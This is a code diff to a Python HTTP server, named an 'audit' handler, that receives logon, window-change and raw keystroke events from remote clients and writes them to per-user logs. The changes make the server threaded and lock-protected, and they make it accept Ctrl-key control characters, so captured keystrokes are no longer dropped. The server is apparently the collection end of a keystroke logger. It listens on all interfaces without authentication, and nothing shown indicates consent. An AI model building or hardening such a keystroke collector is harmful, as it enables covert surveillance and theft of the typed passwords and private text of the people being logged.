@@ -1,14 +1,19 @@
 import json
 import logging
 import os
+import threading
 from datetime import datetime
-from http.server import BaseHTTPRequestHandler, HTTPServer
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 HOST    = "0.0.0.0"
 PORT    = 8080
 LOG_DIR = "logs"
 
 os.makedirs(LOG_DIR, exist_ok=True)
+
+# Serialize appends — the server is threaded, so concurrent writes to the
+# same per-user log would otherwise interleave.
+_log_lock = threading.Lock()
 
 logging.basicConfig(
     level=logging.INFO,
@@ -36,8 +41,9 @@ def user_log_path(username: str) -> str:
 
 
 def write_user_log(username: str, line: str):
-    with open(user_log_path(username), "a", encoding="utf-8") as f:
-        f.write(line + "\n")
+    with _log_lock:
+        with open(user_log_path(username), "a", encoding="utf-8") as f:
+            f.write(line + "\n")
 
 
 def handle_logon(d):
@@ -53,7 +59,7 @@ def handle_logon(d):
 
 def handle_window_change(d):
     user    = d.get("username", "unknown")
-    process = d.get("process",  "unknown")
+    process = d.get("process")  or "unknown"   # null when Get-Process fails client-side
     title   = d.get("window_title", "")
     ts      = d.get("timestamp", "")
     line    = f"[{ts}] WINDOW_CHANGE  Process={process:<20s}  Title={title}"
@@ -63,8 +69,8 @@ def handle_window_change(d):
 
 def handle_keystrokes(d):
     user       = d.get("username",   "unknown")
-    window     = d.get("window",     "")
-    keystrokes = d.get("keystrokes", "").replace("\n", "[ENTER]").replace("\r", "")
+    window     = d.get("window")  or ""
+    keystrokes = (d.get("keystrokes") or "").replace("\n", "[ENTER]").replace("\r", "")
     ts         = d.get("timestamp",  "")
     pid        = d.get("pid", "?")
     seq        = d.get("seq", "?")
@@ -86,7 +92,11 @@ class AuditHandler(BaseHTTPRequestHandler):
         body   = self.rfile.read(length)
 
         try:
-            d          = json.loads(body)
+            # strict=False tolerates the raw control characters the client emits for
+            # Ctrl-key combos (Ctrl+C -> 0x03, etc.), which its hand-rolled Escape()
+            # does not encode. Without this, any Ctrl combo makes the whole keystroke
+            # payload unparseable and it gets dropped.
+            d          = json.loads(body.decode("utf-8", errors="replace"), strict=False)
             event_type = d.get("event_type", "unknown")
             handler    = HANDLERS.get(event_type)
             if handler:
@@ -94,9 +104,13 @@ class AuditHandler(BaseHTTPRequestHandler):
             else:
                 logging.warning("Unknown event_type=%s  payload=%s", event_type, d)
         except json.JSONDecodeError:
-            logging.warning("Malformed payload: %s", body)
+            logging.warning("Malformed JSON payload: %s", body[:500])
+        except Exception:
+            # Never let a handler bug silently drop an event — surface it.
+            logging.exception("Handler error for payload: %s", body[:500])
         finally:
             self.send_response(200)
+            self.send_header("Content-Length", "0")
             self.end_headers()
 
     def log_message(self, *args):
@@ -104,7 +118,7 @@ class AuditHandler(BaseHTTPRequestHandler):
 
 
 if __name__ == "__main__":
-    server = HTTPServer((HOST, PORT), AuditHandler)
+    server = ThreadingHTTPServer((HOST, PORT), AuditHandler)
     logging.info("Listening on %s:%d  |  Writing logs to ./%s/", HOST, PORT, LOG_DIR)
     try:
         server.serve_forever()
